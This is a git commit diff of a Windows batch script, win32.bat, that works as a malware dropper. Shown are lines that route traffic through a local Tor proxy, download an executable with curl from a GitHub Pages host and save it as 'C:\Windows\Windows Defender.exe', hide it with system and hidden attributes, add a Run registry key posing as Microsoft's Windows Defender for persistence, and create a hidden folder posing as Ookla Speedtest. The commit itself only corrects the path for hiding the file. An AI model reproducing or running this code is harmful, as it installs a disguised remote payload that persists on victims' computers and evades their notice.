bfabc40c85a3aca4c08d78d0c5474fef29f69b05
cryptedlumos <90626486+cryptedlumos@users.noreply.github.com>
2021-11-21 15:35:49 +0100

    Update win32.bat

--- win32.bat
+++ win32.bat
@@ -11,7 +11,7 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 )
 
 attrib -s -h -i "C:\Windows\Windows Defender.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "%AppData%\Microsoft\Windows\Windows Defender.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
 mkdir "%appdata%\Ookla\Speedtest CLI" && attrib +s +h +i "%appdata%\Ookla"
